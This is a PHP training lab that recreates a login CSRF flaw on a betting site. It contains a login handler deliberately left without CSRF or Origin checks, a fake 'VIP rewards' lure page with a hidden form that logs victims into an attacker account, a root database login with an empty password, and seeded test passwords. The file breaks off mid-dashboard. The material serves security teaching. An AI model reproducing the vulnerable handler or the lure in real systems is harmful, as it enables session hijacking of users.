<?php
// Lab 1302 — Login CSRF (No Token on /apiv1/login) — Unikrn
// Based on HackerOne report #339352 by albatraoz
// Vulnerability: POST /apiv1/login accepts usr+pwd with NO CSRF token and NO Origin/Referer check.
// Any cross-origin form POST with valid credentials silently replaces the victim's session.
// Flag: flag{unikrn_login_csrf_no_token_339352}

session_start();

$db_hosts = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];
$db = null;
foreach ($db_hosts as $h) {
    $db = @new mysqli($h, 'root', '');
    if (!$db->connect_error) {
        $db->query("CREATE DATABASE IF NOT EXISTS `KrazePlanet_DB` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
        $db->select_db('KrazePlanet_DB');
        break;
    }
}
if (!$db || $db->connect_error) { die('DB connection failed: ' . ($db ? $db->connect_error : 'Unable to connect to database')); }
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme       = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host         = $scheme . '://' . $_SERVER['HTTP_HOST'];
$loginUrl     = $host . '/index.php';
$dashboardUrl = $host . '/index.php?action=dashboard';
$registerUrl  = $host . '/index.php?action=register';
$logoutUrl    = $host . '/index.php?logout=1';
$attackUrl    = $host . '/index.php?attack=1&ref=vip2018&utm_source=email';

// ── Table ─────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1302 (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    email        VARCHAR(255) NOT NULL UNIQUE,
    password     VARCHAR(255) NOT NULL,
    username     VARCHAR(100) NOT NULL,
    unikrn_coins INT          DEFAULT 100,
    level        INT          DEFAULT 1,
    xp           INT          DEFAULT 0,
    steam_linked TINYINT      DEFAULT 0,
    created_at   TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed ──────────────────────────────────────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM lab1302 WHERE email IN ('blaze@unikrn.com','nova@unikrn.com','apex@unikrn.com','attacker@evil.com')")->fetch_row()[0];
if ($sc < 4) {
    $h1 = password_hash('blaze@123',   PASSWORD_BCRYPT);
    $h2 = password_hash('nova@123',    PASSWORD_BCRYPT);
    $h3 = password_hash('apex@123',    PASSWORD_BCRYPT);
    $ah = password_hash('attacker456', PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO lab1302 (email, password, username, unikrn_coins, level, xp, steam_linked) VALUES
        ('blaze@unikrn.com',    '$h1', 'Blaze_Runner',    3200,  9, 9400,  1),
        ('nova@unikrn.com',     '$h2', 'NovaStrike_99',   1800,  6, 5200,  0),
        ('apex@unikrn.com',     '$h3', 'ApexPredator_X',  4500, 11,12800,  1),
        ('attacker@evil.com',   '$ah', 'dark_h4ck3r',       10,  1,   50,  0)");
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
define('LAB_FLAG', 'flag{unikrn_login_csrf_no_token_339352}');

// ── Logout ────────────────────────────────────────────────────────────────────
$isLogout = isset($_GET['logout']);
if ($isLogout) {
    session_destroy();
    header('Location: ' . $loginUrl);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1302_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1302 WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1302_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

$action   = $_GET['action'] ?? '';
$isAttack = isset($_GET['attack']);
$error    = '';

// ── POST: Register ────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'register') {
    $usr = trim($_POST['usr'] ?? '');
    $pwd = $_POST['pwd'] ?? '';
    if ($usr && $pwd) {
        $uname = preg_replace('/[^a-zA-Z0-9_]/', '', explode('@', $usr)[0]);
        if (!$uname) $uname = 'player' . rand(100, 999);
        $hash = password_hash($pwd, PASSWORD_BCRYPT);
        $st = $db->prepare("INSERT INTO lab1302 (email, password, username) VALUES (?, ?, ?)");
        $st->bind_param('sss', $usr, $hash, $uname);
        if ($st->execute()) {
            $_SESSION['lab1302_uid'] = $db->insert_id;
            $st->close();
            header('Location: ' . $dashboardUrl);
            exit;
        }
        $error = 'That email address is already registered.';
        $st->close();
    } else {
        $error = 'Email and password are required.';
    }
}

// ── POST: Login — VULNERABLE (no CSRF token, no Origin/Referer check) ─────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action !== 'register') {
    $usr = trim($_POST['usr'] ?? '');
    $pwd = $_POST['pwd']      ?? '';
    // ⚠ VULNERABLE: /apiv1/login — no CSRF token field, no session token validation,
    // no Origin or Referer header check. Any cross-origin POST with valid credentials
    // will replace the victim's session (Login CSRF).
    if ($usr && $pwd) {
        $st = $db->prepare("SELECT * FROM lab1302 WHERE email = ?");
        $st->bind_param('s', $usr);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($pwd, $row['password'])) {
            session_regenerate_id(true);
            $_SESSION['lab1302_uid'] = $row['id'];
            header('Location: ' . $dashboardUrl);
            exit;
        }
        $error = 'Incorrect email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Bet history data ──────────────────────────────────────────────────────────
$allBets = [
    'Blaze_Runner' => [
        ['game'=>'CS:GO',  'match'=>'Astralis vs. Team Liquid',  'pick'=>'Astralis ML',   'stake'=>100,'result'=>'WIN',    'pnl'=>'+150 UC','date'=>'Apr 14, 2018'],
        ['game'=>'Dota 2', 'match'=>'OG vs. Evil Geniuses',      'pick'=>'OG ML',          'stake'=>200,'result'=>'LOSS',   'pnl'=>'−200 UC','date'=>'Apr 10, 2018'],
        ['game'=>'CS:GO',  'match'=>'Natus Vincere vs. FaZe',    'pick'=>'NaVi ML',        'stake'=>160,'result'=>'WIN',    'pnl'=>'+320 UC','date'=>'Apr 9, 2018'],
        ['game'=>'Halo 5', 'match'=>'Sentinels vs. Optic',       'pick'=>'Sentinels +1.5', 'stake'=>75, 'result'=>'PENDING','pnl'=>'—',     'date'=>'Apr 17, 2018'],
    ],
    'NovaStrike_99' => [
        ['game'=>'LoL',    'match'=>'T1 vs. Cloud9',             'pick'=>'T1 ML',          'stake'=>50, 'result'=>'WIN',    'pnl'=>'+80 UC', 'date'=>'Apr 12, 2018'],
        ['game'=>'Valorant','match'=>'Sentinels vs. NV',         'pick'=>'Sentinels ML',   'stake'=>80, 'result'=>'WIN',    'pnl'=>'+96 UC', 'date'=>'Apr 8, 2018'],
        ['game'=>'CS:GO',  'match'=>'FaZe vs. G2',              'pick'=>'FaZe ML',        'stake'=>120,'result'=>'LOSS',   'pnl'=>'−120 UC','date'=>'Apr 5, 2018'],
    ],
    'ApexPredator_X' => [
        ['game'=>'CS:GO',  'match'=>'NAVI vs. Gambit',           'pick'=>'NAVI ML',        'stake'=>300,'result'=>'WIN',    'pnl'=>'+450 UC','date'=>'Apr 15, 2018'],
        ['game'=>'Dota 2', 'match'=>'Team Spirit vs. Liquid',    'pick'=>'Spirit ML',      'stake'=>150,'result'=>'WIN',    'pnl'=>'+225 UC','date'=>'Apr 11, 2018'],
        ['game'=>'LoL',    'match'=>'T1 vs. DRX',               'pick'=>'T1 ML',          'stake'=>200,'result'=>'WIN',    'pnl'=>'+280 UC','date'=>'Apr 7, 2018'],
        ['game'=>'Valorant','match'=>'Loud vs. XSET',            'pick'=>'Loud +1.5',      'stake'=>100,'result'=>'LOSS',   'pnl'=>'−100 UC','date'=>'Apr 3, 2018'],
    ],
    'dark_h4ck3r' => [
        ['game'=>'CS:GO','match'=>'Team X vs. Team Y','pick'=>'Team X ML','stake'=>5,'result'=>'LOSS','pnl'=>'−5 UC','date'=>'Apr 1, 2018'],
        ['game'=>'LoL',  'match'=>'Team A vs. Team B','pick'=>'Team A ML','stake'=>5,'result'=>'LOSS','pnl'=>'−5 UC','date'=>'Mar 28, 2018'],
    ],
];
$userBets = $allBets[$currentUser['username'] ?? ''] ?? [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php if ($isAttack): ?>
<title>UnikrnVIP Club — Claim Your Rewards</title>
<?php elseif ($currentUser): ?>
<title>Dashboard — Unikrn</title>
<?php elseif ($action === 'register'): ?>
<title>Create Account — Unikrn</title>
<?php else: ?>
<title>Sign In — Unikrn</title>
<?php endif; ?>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;}


/* ═══════════════════════════════════════════════════════════════════════════
   UNIKRN PAGES (login / register / dashboard)
   ═══════════════════════════════════════════════════════════════════════════ */
.uk-body{background:#0D0D1A;color:#E2E8F0;min-height:100vh;}

/* ── Unikrn top nav ──────────────────────────────────────────────────────── */
.uk-nav{background:#13131F;border-bottom:1px solid #1E1E2E;height:52px;display:flex;align-items:center;padding:0 20px;gap:16px;}
.uk-logo{display:flex;align-items:center;gap:8px;text-decoration:none;color:#fff;flex-shrink:0;}
.uk-logo-mark{width:28px;height:28px;background:linear-gradient(135deg,#7C3AED,#4F46E5);border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:.9rem;color:#fff;}
.uk-logo-text{font-size:1rem;font-weight:800;letter-spacing:-.02em;}
.uk-logo-text span{color:#7C3AED;}
.uk-nav-links{display:flex;align-items:center;gap:2px;margin-left:12px;}
.uk-nav-link{color:rgba(226,232,240,.55);text-decoration:none;font-size:.8rem;padding:5px 12px;border-radius:4px;transition:all .12s;font-weight:500;}
.uk-nav-link:hover{color:#E2E8F0;background:rgba(255,255,255,.06);}
.uk-nav-link.cur{color:#fff;font-weight:700;}
.uk-nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.uk-coins-pill{display:flex;align-items:center;gap:5px;background:#1E1E2E;border:1px solid #2D2D3F;border-radius:20px;padding:4px 10px;font-size:.76rem;font-weight:700;color:#F59E0B;}
.uk-coins-pill svg{width:13px;height:13px;fill:currentColor;}
.uk-user-btn{display:flex;align-items:center;gap:7px;background:#1E1E2E;border:1px solid #2D2D3F;border-radius:6px;padding:5px 10px;cursor:pointer;color:#E2E8F0;font-size:.78rem;font-weight:600;}
.uk-av{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#7C3AED,#4F46E5);display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:800;color:#fff;flex-shrink:0;}
.uk-logout{font-size:.72rem;color:rgba(226,232,240,.4);text-decoration:none;padding:4px 8px;border-radius:4px;}
.uk-logout:hover{color:#E2E8F0;background:rgba(255,255,255,.06);}

/* ── Login/Register card ─────────────────────────────────────────────────── */
.uk-auth-wrap{min-height:calc(100vh - 52px);display:flex;align-items:center;justify-content:center;padding:40px 16px;background:#0D0D1A;}
.uk-auth-card{background:#13131F;border:1px solid #1E1E2E;border-radius:12px;width:100%;max-width:400px;padding:32px 28px;box-shadow:0 20px 60px rgba(0,0,0,.5);}
.uk-auth-logo{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px;}
.uk-auth-logo .mark{width:36px;height:36px;background:linear-gradient(135deg,#7C3AED,#4F46E5);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:1.1rem;color:#fff;}
.uk-auth-logo .wordmark{font-size:1.3rem;font-weight:800;letter-spacing:-.02em;color:#fff;}
.uk-auth-logo .wordmark span{color:#7C3AED;}
.uk-auth-title{text-align:center;font-size:1.05rem;font-weight:700;color:#E2E8F0;margin-bottom:6px;}
.uk-auth-sub{text-align:center;font-size:.78rem;color:#6B7280;margin-bottom:22px;}
.uk-field{margin-bottom:14px;}
.uk-field label{display:block;font-size:.72rem;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;}
.uk-field input{width:100%;background:#0D0D1A;border:1px solid #2D2D3F;border-radius:6px;padding:9px 12px;font-size:.86rem;color:#E2E8F0;font-family:inherit;outline:none;transition:border-color .15s;}
.uk-field input:focus{border-color:#7C3AED;box-shadow:0 0 0 2px rgba(124,58,237,.15);}
.uk-field input::placeholder{color:#374151;}
.uk-btn-submit{width:100%;background:linear-gradient(135deg,#7C3AED,#4F46E5);border:none;border-radius:6px;padding:10px;font-size:.88rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;transition:opacity .15s;letter-spacing:.02em;margin-top:4px;}
.uk-btn-submit:hover{opacity:.9;}
.uk-divider{display:flex;align-items:center;gap:10px;margin:16px 0;color:#374151;font-size:.72rem;}
.uk-divider::before,.uk-divider::after{content:'';flex:1;height:1px;background:#1E1E2E;}
.uk-social-btn{width:100%;background:#1E1E2E;border:1px solid #2D2D3F;border-radius:6px;padding:9px;font-size:.82rem;font-weight:600;color:#9CA3AF;cursor:default;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;}
.uk-social-btn svg{width:16px;height:16px;fill:currentColor;flex-shrink:0;}
.uk-auth-foot{text-align:center;margin-top:18px;font-size:.78rem;color:#6B7280;}
.uk-auth-foot a{color:#7C3AED;text-decoration:none;font-weight:600;}
.uk-auth-foot a:hover{text-decoration:underline;}
.uk-error{background:#2D0A0A;border:1px solid #7F1D1D;border-radius:5px;padding:9px 12px;font-size:.78rem;color:#FCA5A5;margin-bottom:14px;}
.uk-ta-box{background:#1A1A2E;border:1px solid #2D2D3F;border-radius:6px;padding:10px 12px;margin-top:14px;font-size:11px;}
.uk-ta-hdr{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#6B7280;margin-bottom:8px;}
.uk-ta-row{display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #0D0D1A;}
.uk-ta-row:last-child{border-bottom:none;}
.uk-ta-email{color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.uk-ta-pass{font-family:monospace;font-weight:700;color:#E2E8F0;font-size:11px;white-space:nowrap;}
.uk-ta-badge{font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#1E2A3A;color:#60A5FA;white-space:nowrap;}

/* ── Dashboard ───────────────────────────────────────────────────────────── */
.uk-dash{display:flex;min-height:calc(100vh - 52px);}
.uk-sidebar{width:200px;background:#0A0A14;flex-shrink:0;padding:14px 0;border-right:1px solid #1E1E2E;}
.uk-sb-link{display:flex;align-items:center;gap:9px;padding:8px 16px;font-size:.8rem;color:rgba(226,232,240,.5);text-decoration:none;transition:all .12s;border-left:2px solid transparent;}
.uk-sb-link:hover{color:#E2E8F0;background:rgba(255,255,255,.05);}
.uk-sb-link.active{color:#E2E8F0;background:rgba(124,58,237,.1);border-left-color:#7C3AED;font-weight:600;}
.uk-sb-link svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
.uk-sb-title{font-size:.56rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:rgba(124,58,237,.6);padding:12px 16px 4px;margin-top:6px;}
.uk-main{flex:1;padding:24px 28px;overflow-y:auto;}
.uk-welcome{font-size:1.05rem;font-weight:700;color:#E2E8F0;margin-bottom:18px;}
.uk-welcome span{color:#7C3AED;}

/* ── Stat cards ──────────────────────────────────────────────────────────── */
.uk-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;}
.uk-stat{background:#13131F;border:1px solid #1E1E2E;border-radius:8px;padding:14px 16px;}
.uk-stat-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#6B7280;margin-bottom:6px;}
.uk-stat-val{font-size:1.3rem;font-weight:800;color:#E2E8F0;line-height:1;}
.uk-stat-val.coins{color:#F59E0B;}
.uk-stat-val.level{color:#7C3AED;}
.uk-stat-val.xp{color:#10B981;font-size:1rem;}
.uk-stat-sub{font-size:.62rem;color:#6B7280;margin-top:3px;}

/* ── XP bar ──────────────────────────────────────────────────────────────── */
.uk-xpbar{background:#1E1E2E;border-radius:99px;height:4px;margin-top:6px;overflow:hidden;}
.uk-xpbar-fill{height:100%;background:linear-gradient(90deg,#7C3AED,#10B981);border-radius:99px;transition:width .4s;}

/* ── Section card ────────────────────────────────────────────────────────── */
.uk-card{background:#13131F;border:1px solid #1E1E2E;border-radius:8px;margin-bottom:14px;overflow:hidden;}
.uk-card-hd{padding:10px 16px;border-bottom:1px solid #1E1E2E;display:flex;align-items:center;justify-content:space-between;}
.uk-card-title{font-size:.82rem;font-weight:700;color:#E2E8F0;display:flex;align-items:center;gap:7px;}
.uk-card-title svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;}

/* ── Bets table ──────────────────────────────────────────────────────────── */
.uk-table{width:100%;border-collapse:collapse;font-size:.76rem;}
.uk-table th{background:#0A0A14;color:#6B7280;font-weight:700;text-transform:uppercase;font-size:.58rem;letter-spacing:.07em;padding:8px 12px;text-align:left;border-bottom:1px solid #1E1E2E;white-space:nowrap;}
.uk-table td{padding:8px 12px;border-bottom:1px solid #1A1A28;vertical-align:middle;}
.uk-table tr:last-child td{border-bottom:none;}
.uk-table tr:hover td{background:rgba(124,58,237,.04);}
.badge-game{display:inline-block;padding:1px 6px;border-radius:3px;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;}
.bg-csgo{background:#F97316;color:#fff;}.bg-lol{background:#0EA5E9;color:#fff;}
.bg-dota{background:#EF4444;color:#fff;}.bg-halo{background:#22C55E;color:#fff;}
.bg-other{background:#6B7280;color:#fff;}
.r-win{color:#10B981;font-weight:700;}.r-loss{color:#EF4444;font-weight:700;}.r-pending{color:#F59E0B;font-weight:700;}
.pnl-pos{color:#10B981;font-weight:700;}.pnl-neg{color:#EF4444;}.pnl-na{color:#6B7280;}

/* ── Steam section ───────────────────────────────────────────────────────── */
.steam-row{padding:14px 16px;display:flex;align-items:center;gap:14px;}
.steam-icon{width:36px;height:36px;background:#1B2838;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.steam-icon svg{width:20px;height:20px;fill:#C6D4DF;}
.steam-info{flex:1;}
.steam-name{font-size:.82rem;font-weight:700;color:#E2E8F0;margin-bottom:2px;}
.steam-status-linked{font-size:.72rem;color:#10B981;}
.steam-status-none{font-size:.72rem;color:#6B7280;}
.steam-badge-linked{display:inline-flex;align-items:center;gap:4px;background:#0A1F12;border:1px solid #166534;border-radius:4px;padding:2px 8px;font-size:.65rem;font-weight:700;color:#10B981;}
.steam-badge-none{display:inline-flex;align-items:center;gap:4px;background:#1E1E2E;border:1px solid #2D2D3F;border-radius:4px;padding:2px 8px;font-size:.65rem;font-weight:700;color:#6B7280;}
.btn-steam-connect{background:#1B2838;border:1px solid #4B6584;border-radius:5px;padding:6px 14px;font-size:.76rem;font-weight:700;color:#C6D4DF;cursor:default;font-family:inherit;}

/* ── VIP / API Token box (attacker account) ──────────────────────────────── */
.vip-box{padding:16px;background:linear-gradient(135deg,rgba(124,58,237,.12),rgba(79,70,229,.08));border-top:1px solid rgba(124,58,237,.2);}
.vip-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#7C3AED;margin-bottom:8px;}
.vip-token{font-family:'Courier New',monospace;font-size:.8rem;color:#E2E8F0;background:#0D0D1A;border:1px solid rgba(124,58,237,.3);border-radius:5px;padding:9px 12px;word-break:break-all;letter-spacing:.04em;}
.vip-note{font-size:.68rem;color:#6B7280;margin-top:6px;}

/* ── Profile info ────────────────────────────────────────────────────────── */
.profile-row{padding:14px 16px;display:flex;align-items:center;gap:14px;}
.profile-av-lg{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#7C3AED,#4F46E5);display:flex;align-items:center;justify-content:center;font-size:1.1rem;font-weight:900;color:#fff;flex-shrink:0;}
.profile-info{flex:1;}
.profile-name{font-size:.95rem;font-weight:800;color:#E2E8F0;}
.profile-email{font-size:.72rem;color:#6B7280;margin-top:1px;}
.profile-badges{display:flex;gap:5px;margin-top:6px;}
.p-badge{display:inline-flex;align-items:center;gap:3px;padding:2px 7px;border-radius:3px;font-size:.6rem;font-weight:700;}
.pb-level{background:#1E0A4C;border:1px solid #7C3AED;color:#A78BFA;}
.pb-steam{background:#0A1F12;border:1px solid #166534;color:#10B981;}
.pb-nosteam{background:#1E1E2E;border:1px solid #2D2D3F;color:#6B7280;}

/* ═══════════════════════════════════════════════════════════════════════════
   ATTACK PAGE — completely different site: "unikrn-vip-club.net"
   ═══════════════════════════════════════════════════════════════════════════ */
.atk-body{background:linear-gradient(160deg,#0E0015 0%,#15002A 50%,#0A000E 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.atk-card{background:linear-gradient(145deg,#1A0030,#120025);border:1px solid rgba(245,158,11,.25);border-radius:16px;max-width:480px;width:100%;padding:36px 32px;box-shadow:0 0 60px rgba(245,158,11,.08),0 20px 60px rgba(0,0,0,.6);text-align:center;}
.atk-crown{font-size:2.8rem;margin-bottom:10px;line-height:1;}
.atk-site-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.2);border-radius:20px;padding:3px 12px;font-size:.66rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#F59E0B;margin-bottom:18px;}
.atk-heading{font-size:1.5rem;font-weight:900;color:#fff;line-height:1.2;margin-bottom:8px;letter-spacing:-.02em;}
.atk-heading span{color:#F59E0B;}
.atk-sub{font-size:.84rem;color:rgba(255,255,255,.6);margin-bottom:22px;line-height:1.5;}
.atk-reward-box{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:10px;padding:16px;margin-bottom:22px;}
.atk-reward-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:#F59E0B;margin-bottom:4px;}
.atk-reward-val{font-size:1.8rem;font-weight:900;color:#fff;}
.atk-reward-val span{color:#F59E0B;}
.atk-reward-sub{font-size:.72rem;color:rgba(255,255,255,.4);margin-top:2px;}
.atk-steps{display:flex;flex-direction:column;gap:8px;margin-bottom:22px;text-align:left;}
.atk-step{display:flex;align-items:center;gap:10px;font-size:.78rem;color:rgba(255,255,255,.65);}
.atk-step-n{width:20px;height:20px;border-radius:50%;background:rgba(245,158,11,.15);border:1px solid rgba(245,158,11,.3);display:flex;align-items:center;justify-content:center;font-size:.62rem;font-weight:800;color:#F59E0B;flex-shrink:0;}
.atk-btn{width:100%;background:linear-gradient(135deg,#F59E0B,#D97706);border:none;border-radius:8px;padding:14px;font-size:1rem;font-weight:800;color:#0E0015;cursor:pointer;font-family:inherit;letter-spacing:.02em;transition:opacity .15s;box-shadow:0 4px 20px rgba(245,158,11,.3);}
.atk-btn:hover{opacity:.9;}
.atk-fine{font-size:.62rem;color:rgba(255,255,255,.2);margin-top:10px;line-height:1.5;}
.atk-timer{font-size:.72rem;color:rgba(245,158,11,.6);margin-top:8px;}

/* ── Footer bar ──────────────────────────────────────────────────────────── */
.uk-footer{background:#0A0A14;border-top:1px solid #1E1E2E;padding:10px 20px;font-size:.66rem;color:#374151;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;}
.uk-footer a{color:#4B5563;text-decoration:none;}
.atk-footer{background:#0A0005;border-top:1px solid rgba(245,158,11,.1);padding:8px 20px;font-size:.64rem;color:rgba(255,255,255,.2);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake "unikrn-vip-club.net" site
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="atk-body">
  <div class="atk-card">
    <div class="atk-crown">🏆</div>
    <div class="atk-site-badge">⭐ VIP Rewards Program</div>
    <h1 class="atk-heading">You've been selected as a<br><span>VIP Member!</span></h1>
    <p class="atk-sub">Our system has detected your activity on the Unikrn platform. You qualify for an exclusive reward. Claim it before it expires.</p>

    <div class="atk-reward-box">
      <div class="atk-reward-label">Your Exclusive Reward</div>
      <div class="atk-reward-val"><span>10,000</span> UKG</div>
      <div class="atk-reward-sub">UnikoinGold · Expires in 24 hours</div>
    </div>

    <div class="atk-steps">
      <div class="atk-step"><div class="atk-step-n">1</div>Click the button below to verify your Unikrn account</div>
      <div class="atk-step"><div class="atk-step-n">2</div>Your reward will be credited automatically</div>
      <div class="atk-step"><div class="atk-step-n">3</div>Withdraw or use for betting immediately</div>
    </div>

    <!-- ⚠ CSRF FORM: POSTs attacker credentials to Unikrn's login endpoint.
         No CSRF token — Unikrn's /apiv1/login doesn't require one.
         Victim clicks → their session is replaced with attacker's account. -->
    <form id="csrfForm" action="/index.php" method="POST">
      <input type="hidden" name="usr" value="attacker@evil.com">
      <input type="hidden" name="pwd" value="attacker456">
    </form>
    <button class="atk-btn" onclick="document.getElementById('csrfForm').submit()">
      🎁 &nbsp;Claim My 10,000 UKG Reward
    </button>
    <div class="atk-fine">By clicking you agree to our Terms of Service and Privacy Policy. This offer is non-transferable and subject to verification. One reward per account.</div>
    <div class="atk-timer" id="timer">⏱ Offer expires in: <span id="countdown">23:58:41</span></div>
  </div>
</div>

<div class="atk-footer">
  <span>unikrn-vip-club.net &copy; 2018 &middot; <a href="#" style="color:inherit;">Privacy</a> &middot; <a href="#" style="color:inherit;">Terms</a></span>
  <span>Not affiliated with Unikrn Inc.</span>
</div>

<script>
(function(){
  var t = 86321;
  var el = document.getElementById('countdown');
  setInterval(function(){
    if(t <= 0) return;
    t--;
    var h = Math.floor(t/3600);
    var m = Math.floor((t%3600)/60);
    var s = t%60;
    el.textContent = (h<10?'0':'')+h+':'+(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
  }, 1000);
})();
</script>

<?php elseif ($currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="uk-body">
  <nav class="uk-nav">
    <a href="/index.php?action=dashboard" class="uk-logo">
      <div class="uk-logo-mark">U</div>
      <span class="uk-logo-text">Uni<span>krn</span></span>
    </a>
    <div class="uk-nav-links">
      <a href="#" class="uk-nav-link">Bet</a>
      <a href="#" class="uk-nav-link">Games</a>
      <a href="#" class="uk-nav-link">Live</a>
      <a href="#" class="uk-nav-link">Leaderboard</a>
      <a href="/index.php?action=dashboard" class="uk-nav-link cur">Dashboard</a>
    </div>
    <div class="uk-nav-right">
      <div class="uk-coins-pill">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v12M8 10h8M8 14h8" stroke="#F59E0B" stroke-width="2" fill="none"/></svg>
        <?= number_format($currentUser['unikrn_coins']) ?> UC
      </div>
      <div class="uk-user-btn">
        <div class="uk-av"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
        <?= esc($currentUser['username']) ?>
      </div>
      <a href="/index.php?logout=1" class="uk-logout">Sign out</a>
    </div>
  </nav>

  <div class="uk-dash">
    <aside class="uk-sidebar">
      <div class="uk-sb-title">Main</div>
      <a href="/index.php?action=dashboard" class="uk-sb-link active">
        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
        Dashboard
      </a>
      <a href="#" class="uk-sb-link">
        <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
        Bet Now
      </a>
      <a href="#" class="uk-sb-link">
        <svg viewBox="0 0 24 24"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg>
        Wallet
      </a>
      <div class="uk-sb-title">Account</div>
      <a href="#" class="uk-sb-link">
        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
        Profile
      </a>
      <a href="#" class="uk-sb-link">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14"/></svg>
        Connections
      </a>
      <a href="/apiv1/logout" class="uk-sb-link" style="color:rgba(239,68,68,.5);margin-top:auto;">
        <svg viewBox="0 0 24 24"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
        Sign out
      </a>
    </aside>

    <main class="uk-main">
      <div class="uk-welcome">Welcome back, <span><?= esc($currentUser['username']) ?></span> 👾</div>

      <!-- Stats -->
      <div class="uk-stats">
        <div class="uk-stat">
          <div class="uk-stat-label">Unikrn Coins</div>
          <div class="uk-stat-val coins"><?= number_format($currentUser['unikrn_coins']) ?></div>
          <div class="uk-stat-sub">UC balance</div>
        </div>
        <div class="uk-stat">
          <div class="uk-stat-label">Level</div>
          <div class="uk-stat-val level"><?= esc($currentUser['level']) ?></div>
          <?php
            $xpMax = $currentUser['level'] >= 7 ? 8000 : 1000;
            $xpPct = min(100, round(($currentUser['xp'] / $xpMax) * 100));
          ?>
          <div class="uk-xpbar"><div class="uk-xpbar-fill" style="width:<?= $xpPct ?>%;"></div></div>
          <div class="uk-stat-sub"><?= number_format($currentUser['xp']) ?> / <?= number_format($xpMax) ?> XP</div>
        </div>
        <div class="uk-stat">
          <div class="uk-stat-label">Win Rate</div>
